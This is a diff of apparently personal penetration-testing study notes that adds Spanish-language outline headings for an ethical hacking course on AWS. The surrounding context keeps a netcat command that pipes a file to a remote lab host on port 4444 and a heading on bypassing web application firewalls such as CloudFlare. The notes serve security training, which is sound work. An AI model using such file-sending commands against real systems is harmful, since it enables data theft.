@@ -1462,7 +1462,27 @@ or on machines provided by hackthebox. They are designed to be fun to hack while
 
                 nc 192.168.20.X 4444 -w 3 < FiletoTransfer
 
-            
+# Hacking ético en entornos reales. AWS
+
+    # Arquitectura y registro en la nube AWS.
+
+    # Registro y configuración de una cuenta AWS.
+
+    # Infraestructura de la red en la nube AWS.
+
+    # Seguridad y computación en la nube AWS.
+
+    # Balanceadores y almacenamiento en la nube AWS.
+
+    # Recopilación de informacion y almacenamiento en la nube AWS.
+
+    # Controles de seguridad en un entorno real.
+
+    # Auditando la infraestructura interna.
+
+    # Tipos de auditoria de seguridad.
+
+    # Eliminando el entorno en AWS.
 
 # Bypass a Web application Firewall, like CloudFlare...
 
